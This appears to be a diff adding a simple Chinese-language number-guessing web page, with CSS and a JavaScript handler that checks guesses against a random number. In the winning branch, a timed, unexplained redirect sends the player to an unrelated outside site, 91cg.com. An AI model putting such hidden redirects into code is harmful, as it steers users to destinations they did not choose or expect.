@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>猜数字游戏</title>
+    <style>
+        h1 {
+            font-size: 5em; /* 很大的标题字体大小 */
+        }
+        p {
+            font-size: 3em; /* 很大的段落字体大小 */
+        }
+        input {
+            font-size: 2.5em; /* 很大的输入框字体大小 */
+            width: 100%; /* 足够宽的输入框宽度 */
+        }
+        button {
+            font-size: 2.5em; /* 很大的按钮字体大小 */
+            padding: 10px 20px; /* 较大的按钮内边距 */
+        }
+    </style>
+        <style>
+        button {
+            display: block;
+            margin: 0 auto;
+            margin-bottom: 30px;
+            width: 300px;
+            height: 100px;
+            font-size: 35px;
+        }
+    </style>
+</head>
+</head>
+<body>
+    <h1>猜数字游戏</h1>
+    <p>我生成了一个1到100之间的随机数字，猜猜看是哪个？</p>
+    <input type="text" id="guessInput">
+    <button id="guessButton">猜一猜</button>
+    <p id="result"></p>
+
+    <script>
+        var targetNumber = Math.floor(Math.random() * 100) + 1;
+        var guessButton = document.getElementById('guessButton');
+        var resultDisplay = document.getElementById('result');
+        var guessInput = document.getElementById('guessInput');
+
+        guessButton.addEventListener('click', function () {
+            var userGuess = parseInt(guessInput.value);
+            if (isNaN(userGuess)) {
+                resultDisplay.textContent = '请输入一个有效的数字';
+            } else {
+                if (userGuess === targetNumber) {
+                    resultDisplay.textContent = '恭喜，你猜对了！';
+                    setTimeout(function () {
+                        window.location.href = "https://91cg.com/";
+                    }, 10000);
+                } else if (userGuess < targetNumber) {
+                    resultDisplay.textContent = '猜小了，再试一次';
+                } else {
+                    resultDisplay.textContent = '猜大了，再试一次';
+                }
+            }
+        });
+    </script>
+</body>
+</html>
